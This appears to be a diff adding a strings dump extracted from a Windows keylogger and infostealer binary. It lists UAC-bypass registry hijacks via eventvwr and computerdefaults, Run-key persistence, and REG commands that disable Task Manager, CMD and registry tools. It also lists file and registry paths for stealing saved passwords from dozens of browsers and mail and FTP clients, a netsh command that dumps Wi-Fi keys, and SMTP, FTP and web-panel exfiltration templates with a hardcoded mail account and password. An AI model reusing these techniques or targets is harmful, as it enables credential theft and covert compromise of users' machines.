@@ -1,0 +1,768 @@
+.lnk
+.lnk
+.lnk
+WScript.Shell
+CreateShortcut
+.lnk
+TargetPath
+cmd.exe
+WorkingDirectory
+Arguments
+/c start
+&start
+& exit
+IconLocation
+Save
+.lnk
+WScript.Shell
+CreateShortcut
+.lnk
+TargetPath
+cmd.exe
+WorkingDirectory
+Arguments
+/c start
+&explorer /root,"%CD%
+" & exit
+IconLocation
+%SystemRoot%\system32\SHELL32.dll,3
+Save
+Software\Classes\
+OpenSubKey
+OpenSubKey
+GetValue
+\DefaultIcon\
+GetValue
+smtp
+%startupfolder%
+\%insfolder%\%insname%
+yyyy-MM-dd HH:mm:ss
+Not resolved yet.
+SOFTWARE\Microsoft\Windows NT\CurrentVersion
+ProductId
+76487-337-8429955-22614
+Software\Classes
+ms-settings\shell\open\command
+Software\Classes\ms-settings\shell\open\command
+DelegateExecute
+Software\Classes
+ms-settings\shell\open\command
+C:\Windows\System32\computerdefaults.exe
+Software\Classes\ms-settings\shell
+open\command
+Software\Classes
+mscfile\shell\open\command
+C:\Windows\System32\eventvwr.exe
+Software\Classes\mscfile\shell
+open\command
+IsInRole
+Windows 7
+Windows 8
+Windows 10
+\temp.tmp
+Windows 10
+webpanel
+%startupfolder%
+\%insfolder%\
+%startupfolder%
+\%insfolder%\
+Software\Microsoft\Windows\CurrentVersion\Run
+%insregname%
+SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run
+%insregname%
+Shutdown -r -t 5
+True
+webpanel
+webpanel
+webpanel
+Johnson
+Miller
+michael
+Abby
+Emily
+John
+root\CIMV2
+SELECT * FROM Win32_VideoController
+SELECT * FROM Win32_Processor
+Name
+Name
+AdapterRAM
+Unknown
+.jpeg
+webpanel
+type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}client={8}link={9}username={10}password={11}screen_link={12}
+screenshots
+smtp
+MM/dd/yyyy HH:mm:ss
+Screen Capture
+Time:
+<br>UserName:
+<br>ComputerName:
+<br>OSFullName:
+<br>CPU:
+<br>RAM:
+<br>IP:
+<hr>
+thai@dahger-hinnawi.com
+yyyy_MM_dd_HH_mm_ss
+Screen
+.jpeg
+/log.tmp
+MM/dd/yyyy HH:mm:ss
+webpanel
+type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}client={8}link={9}username={10}password={11}screen_link={12}
+keylog
+type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}client={8}link={9}username={10}password={11}screen_link={12}
+keylog
+<br>[(
+)]<br>
+<br>
+smtp
+Keystrokes
+Time:
+<br>IP :
+<hr>
+thai@dahger-hinnawi.com
+Keystrokes
+Time:
+<br>UserName:
+<br>ComputerName:
+<br>OSFullName:
+<br>CPU:
+<br>RAM:
+<br>IP:
+<hr>
+thai@dahger-hinnawi.com
+<br>[(
+)]<br>
+<br>
+yyyy_MM_dd_HH_mm_ss
+Keystrokes_
+.html
+<html>Time:
+<br>UserName:
+<br>ComputerName:
+<br>OSFullName:
+<br>CPU:
+<br>RAM:
+<br>IP:
+<hr>
+</html>
+Keystrokes_
+.html
+<html>Time:
+<br>UserName:
+<br>ComputerName:
+<br>OSFullName:
+<br>CPU:
+<br>RAM:
+<br>IP:
+<hr>
+</html>
+<br>[(
+)]<br>
+<br>
+http://checkip.amazonaws.com/
+Stop
+Enabled
+type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}client={8}link={9}username={10}password={11}screen_link={12}
+update
+type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}client={8}link={9}username={10}password={11}screen_link={12}
+update
+type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}client={8}link={9}username={10}password={11}screen_link={12}
+info
+type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}client={8}link={9}username={10}password={11}screen_link={12}
+uninstall
+uninstall
+Software\Microsoft\Windows NT\CurrentVersion\Windows
+Load
+Software\Microsoft\Windows\CurrentVersion\Run
+%insregname%
+type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}client={8}link={9}username={10}password={11}screen_link={12}
+uninstall
+uninstall
+Software\Microsoft\Windows NT\CurrentVersion\Windows
+Load
+Software\Microsoft\Windows\CurrentVersion\Run
+%insregname%
+%ftphost%/
+%ftpuser%
+%ftppassword%
+STOR
+Length
+Write
+Length
+Length
+Close
+%ftphost%/
+%ftpuser%
+%ftppassword%
+STOR
+MM/dd/yyyy HH:mm:ss
+type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}screen_link={8}[passwords]
+passwords
+APPDATA
+\CoreFTP\sites.idx
+HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\
+Host
+HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites
+Port
+HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites
+User
+HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites
+HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites
+Name
+CoreFTP
+webpanel
+client[]={0}link[]={1}username[]={2}password[]={3}
+smtp
+URL:
+<br>
+Username:
+<br>
+Password:
+<br>
+Application:
+<br>
+<hr>
+webpanel
+client[]={0}link[]={1}username[]={2}password[]={3}
+smtp
+URL:
+<br>
+Username:
+<br>
+Password:
+<br>
+Application:
+<br>
+<hr>
+smtp
+Recovered Accounts
+Time:
+<br>UserName:
+<br>ComputerName:
+<br>OSFullName:
+<br>CPU:
+<br>RAM:
+<br>IP:
+<hr>
+thai@dahger-hinnawi.com
+yyyy_MM_dd_HH_mm_ss
+Recovery_
+.html
+<html>Time:
+<br>UserName:
+<br>ComputerName:
+<br>OSFullName:
+<br>CPU:
+<br>RAM:
+<br>IP:
+<hr>
+</html>
+webpanel
+thai@dahger-hinnawi.com
+thai@dahger-hinnawi.com
+OxMrdKp2
+smtp.dahger-hinnawi.com
+:Zone.Identifier
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+EnableLUA
+REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+REG add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f
+HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System
+DisableCMD
+REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
+REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System
+DisableRegistryTools
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore
+DisableSR
+REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
+REG add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
+SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths
+MSCONFIG.EXE
+\tmpG
+.tmp
+length
+length must be > 0
+%filter_list%
+%urlkey%
+%PostURL%
+Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
+POST
+application/x-www-form-urlencoded
+http://checkip.dyndns.org/
+\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}
+&amp;
+&lt;
+&gt;
+&quot;
+<br><span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span>
+<span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span><br>
+<br><span style=font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#0099cc;><b>[
+</b>
+<b>]</b> <span style=font-style:normal;text-decoration:none;text-transform:none;color:#000000;>(
+MM/dd/yyyy HH:mm:ss
+)</span></span><br>
+False
+<font color=#008000>{BACK}</font>
+</font>
+<br>
+<font color=#008000>{ALT+TAB}</font>
+<font color=#008000>{ALT+F4}</font>
+<font color=#008000>{TAB}</font>
+<font color=#008000>{ESC}</font>
+<font color=#008000>{Win}</font>
+<font color=#008000>{CAPSLOCK}</font>
+<font color=#008000>&uarr;</font>
+<font color=#008000>&darr;</font>
+<font color=#008000>&larr;</font>
+<font color=#008000>&rarr;</font>
+<font color=#008000>{DEL}</font>
+<font color=#008000>{END}</font>
+<font color=#008000>{HOME}</font>
+<font color=#008000>{Insert}</font>
+<font color=#008000>{NumLock}</font>
+<font color=#008000>{PageDown}</font>
+<font color=#008000>{PageUp}</font>
+<font color=#008000>{ENTER}</font>
+<br>
+<font color=#008000>{F1}</font>
+<font color=#008000>{F2}</font>
+<font color=#008000>{F3}</font>
+<font color=#008000>{F4}</font>
+<font color=#008000>{F5}</font>
+<font color=#008000>{F6}</font>
+<font color=#008000>{F7}</font>
+<font color=#008000>{F8}</font>
+<font color=#008000>{F9}</font>
+<font color=#008000>{F10}</font>
+<font color=#008000>{F11}</font>
+<font color=#008000>{F12}</font>
+control
+<font color=#008000>{CTRL}</font>
+&amp;
+&lt;
+&gt;
+&quot;
+None
+win32_processor
+processorID
+WinMgmts:
+InstancesOf
+Win32_BaseBoard
+SerialNumber
+origin_url
+username_value
+password_value
+\Google\Chrome\User Data\
+Profile
+Default
+\Login Data
+\Login Data
+Chrome
+logins
+Opera Software\Opera Stable\Login Data
+Opera
+logins
+Yandex\YandexBrowser\User Data\Default\Login Data
+Yandex
+logins
+Firefox
+Firefox
+IELibrary
+IELibrary
+IELibrary.InternetExplorer
+GetSavedPasswords
+UserName
+Password
+Browser
+Major
+Minor
+2F1A6504-0641-44CF-8BB5-3612D865F2E5
+Windows Secure Note
+3CCD5499-87A8-4B10-A215-608888DD3B55
+Windows Web Password Credential
+154E23D0-C644-4E6F-8CE6-5069272F999F
+Windows Credential Picker Protector
+4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+Web Credentials
+77BC582B-F0A6-4E15-4E80-61736B6F3B29
+Windows Credentials
+E69D7838-91B5-4FC9-89D5-230D4D4CC2BC
+Windows Domain Certificate Credential
+3E0E35BE-1B77-43E7-B873-AED901B6275B
+Windows Domain Password Credential
+3C886FF3-2669-4AA2-A8FB-3F6759A77548
+Windows Extended Credential
+00000000-0000-0000-0000-000000000000
+PtrToStructure
+ToInt64
+SchemaId
+pResourceElement
+pIdentityElement
+LastModified
+pPackageSid
+pAuthenticatorElement
+IE/Edge
+\Common Files\Apple\Apple Application Support\plutil.exe
+\Apple Computer\Preferences\keychain.plist
+SeaMonkey
+SeaMonkey
+Comodo\Dragon\User Data\Default\Login Data
+Comodo Dragon
+logins
+MapleStudio\ChromePlus\User Data\Default\Login Data
+CoolNovo
+logins
+Chromium\User Data\Default\Login Data
+SRWare Iron
+logins
+Torch\User Data\Default\Login Data
+Torch Browser
+logins
+UCBrowser\
+Login Data
+journal
+UC Browser
+wow_logins
+PopPassword
+SmtpPassword
+Software\IncrediMail\Identities\
+\Accounts_New
+PopPassword
+SmtpPassword
+EmailAddress
+SmtpServer
+incredimail
+HKEY_CURRENT_USER\Software\Qualcomm\Eudora\CommandLine
+current
+Settings
+SavePasswordText
+Settings
+ReturnAddress
+Eudora
+Thunderbird
+Thunderbird
+BlackHawk
+BlackHawk
+CyberFox
+CyberFox
+K-Meleon
+K-Meleon
+IceCat
+IceCat
+Postbox
+Postbox
+signons3.txt
+objects
+objects
+objects
+Data
+objects
+objects
+Data
+DecryptTripleDes
+Flock Browser
+netsh
+wlan show profile
+All User Profile
+All User Profile * : (?<profile>.*)
+profile
+Wi-Fi
+wlan show profile name="
+" key=clear
+Key Content * : (?<password>.*)
+password
+No Password!
+ALLUSERSPROFILE
+DynDNS\Updater\config.dyndns
+username=
+password=
+t6KzXhCh
+http://DynDns.com
+DynDNS
+APPDATA
+\FileZilla\recentservers.xml
+<Server>
+<Host>
+<Host>
+</Host>
+<Port>
+</Port>
+<User>
+<User>
+</User>
+<Pass encoding="base64">
+<Pass encoding="base64">
+</Pass>
+<Pass>
+<Pass>
+</Pass>
+FileZilla
+SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions
+HostName
+UserName
+Password
+PublicKeyFile
+PortNumber
+[PRIVATE KEY LOCATION: "{0}"]
+WinSCP
+APPDATA
+Username
+All Users
+\FlashFXP\3quick.dat
+port=
+user=
+pass=
+created=
+FlashFXP
+SystemDrive
+\FTP Navigator\Ftplist.txt
+Server
+Password
+No Password
+User
+FTP Navigator
+Programfiles(x86)
+programfiles
+\jDownloader\config\database.script
+programfiles(x86)
+\jDownloader\config\database.script
+INSERT INTO CONFIG VALUES('AccountController','
+JDownloader
+Software\Paltalk
+HKEY_CURRENT_USER\Software\Paltalk\
+http://Paltalk.com
+Paltalk
+APPDATA
+\.purple\accounts.xml
+APPDATA
+\.purple\accounts.xml
+<account>
+<protocol>
+</protocol>
+<name>
+</name>
+<password>
+</password>
+Pidgin
+APPDATA
+\SmartFTP\Client 2.0\Favorites\Quick Connect\
+APPDATA
+\SmartFTP\Client 2.0\Favorites\Quick Connect\*.xml
+<Host>
+</Host>
+<Port>
+</Port>
+<User>
+</User>
+<Password>
+</Password>
+<Name>
+</Name>
+SmartFTP
+appdata
+\Ipswitch\WS_FTP\Sites\ws_ftp.ini
+appdata
+\Ipswitch\WS_FTP\Sites\ws_ftp.ini
+HOST
+WS_FTP
+PWD=
+PWD=
+Substring
+Length
+Length
+Substring
+Substring
+Password decryption failed!
+Mode
+Padding
+CreateDecryptor
+SystemDrive
+\cftp\Ftplist.txt
+;Server=
+;Port=
+;Port=
+;Password=
+;User=
+;Anonymous=
+;Password=
+;User=
+Name=
+;Server=
+FTPCommander
+HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC
+HKEY_CURRENT_USER\SOFTWARE\Vitalwerks\DUC
+USERname
+Password
+UserName
+Password
+http://no-ip.com
+NO-IP
+http://no-ip.com
+NO-IP
+Input text must be a multiple of 4 characters!
++-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
+Input contains illegal character '
+appdata
+\The Bat!
+appdata
+\The Bat!
+\Account.CFN
+\Account.CFN
+TheBat
+Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676
+Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676
+Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676
+Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676
+Email
+IMAP Password
+POP3 Password
+HTTP Password
+SMTP Password
+IMAP Password
+POP3 Password
+HTTP Password
+SMTP Password
+Email
+GetBytes
+SMTP Server
+SMTP Server
+SMTP Server
+Not found!
+Outlook
+HKEY_CURRENT_USER\Software\Aerofox\FoxmailPreview
+Executable
+HKEY_CURRENT_USER\Software\Aerofox\Foxmail\V3.1
+FoxmailPath
+\Storage\
+\Storage\
+\mail\
+\mail\
+\VirtualStore\Program Files\Foxmail\mail\
+\VirtualStore\Program Files\Foxmail\mail\
+\VirtualStore\Program Files (x86)\Foxmail\mail\
+\VirtualStore\Program Files (x86)\Foxmail\mail\
+\Accounts\Account.rec0
+\Account.stg
+\fox.temp
+\fox.temp
+\fox.temp
+\fox.temp
+Length
+Read
+Close
+Dispose
+POP3Host
+SMTPHost
+IncomingServer
+Account
+MailAddress
+Password
+POP3Password
+!empty!
+Foxmail
+No Data!
+\Opera Mail\Opera Mail\wand.dat
+\Opera Mail\Opera Mail\wand.dat
+opera:
+Opera Mail
+abcdefghijklmnopqrstuvwxyz1234567890_-.~!@#$%^&*()[{]}\|';:,<>/?+=
+appdata
+\Pocomail\accounts.ini
+appdata
+\Pocomail\accounts.ini
+Email
+POPPass
+SMTPPass
+SMTP
+PocoMail
+No data!
+<array>
+<dict>
+Length
+<string>
+</string>
+<string>
+</string>
+<data>
+</data>
+Safari Browser
+-convert xml1 -s -o "
+\fixed_keychain.xml"
+ABCDEF
+APPDATA
+\Mozilla\Firefox\
+\Postbox\
+\Thunderbird\
+\Mozilla\SeaMonkey\
+\Flock\Browser\
+\NETGATE Technologies\BlackHawk\
+\8pecxstudios\Cyberfox\
+\K-Meleon\
+\Mozilla\icecat\
+key4.db
+key4.db
+metaData
+password
+item1
+item2
+nssPrivate
+a102
+key3.db
+key3.db
+global-salt
+Version
+password-check
+Value
+global-salt
+Value
+Replace
+Path=([A-z0-9\/\.]+)
+profiles.ini
+logins.json
+logins.json
+\"(hostname|encryptedPassword|encryptedUsername)":"(.*?)"
+[^\u0020-\u007F]
+[^\u0020-\u007F]
+signons.sqlite
+moz_logins
+hostname
+encryptedUsername
+encryptedPassword
+[^\u0020-\u007F]
+[^\u0020-\u007F]
+Mode
+Padding
+CreateDecryptor
+TransformFinalBlock
+Mode
+Padding
+CreateDecryptor
+TransformFinalBlock
+Mode
+Padding
+CreateDecryptor
+TransformFinalBlock
+Type
+Value
+EndsWith
+Substring
+Length
+IndexOf
+Substring
+IndexOf
+UNIQUE
+table
+Software\DownloadManager\Passwords\
+User
+EncPassword
+Internet Download Manager
+SystemDrive
+No Data
+WScript.Shell
+RegRead
+kernel32.dll
+ED01EBFBC9EB5BBEA545AF4D01BF5F1071661840480439C6E5BABE8E080E41AA
